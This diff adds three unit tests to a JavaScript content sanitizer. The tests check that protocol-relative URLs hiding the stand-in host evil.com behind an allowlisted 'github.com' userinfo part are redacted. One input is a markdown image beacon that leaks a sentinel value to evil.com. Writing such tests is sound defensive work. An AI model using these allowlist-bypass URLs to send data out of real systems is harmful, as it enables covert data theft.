@@ -1289,6 +1289,25 @@ describe("sanitize_content.cjs", () => {
       expect(result).not.toContain("//evil.com");
     });
 
+    it("should redact a protocol-relative URL whose allowlisted host is only userinfo", () => {
+      const result = sanitizeContent("![x](//github.com@evil.com/pixel.gif?leak=SENTINEL)");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/pixel.gif");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a protocol-relative URL with userinfo containing a port", () => {
+      const result = sanitizeContent("//github.com:443@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
+    it("should redact a protocol-relative URL with chained userinfo segments", () => {
+      const result = sanitizeContent("//a@github.com@evil.com/x");
+      expect(result).toContain("(evil.com/redacted)");
+      expect(result).not.toContain("evil.com/x");
+    });
+
     it("should allow protocol-relative URLs on allowed domains", () => {
       const result = sanitizeContent("Visit //github.com/repo");
       expect(result).toContain("//github.com/repo");
